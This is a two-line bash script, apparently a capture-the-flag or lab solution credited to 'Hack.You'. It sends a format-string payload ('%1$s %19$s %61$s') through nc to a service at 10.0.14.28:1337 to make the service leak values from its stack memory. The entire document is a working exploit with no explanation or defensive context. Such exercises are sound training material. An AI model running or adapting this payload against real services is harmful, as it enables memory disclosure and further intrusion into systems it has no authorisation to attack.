#!/usr/bin/bash
# Author: Hack.You

python2 -c 'print "%1$s" + " " + "%19$s" + " " + "%61$s"' | nc 10.0.14.28 1337
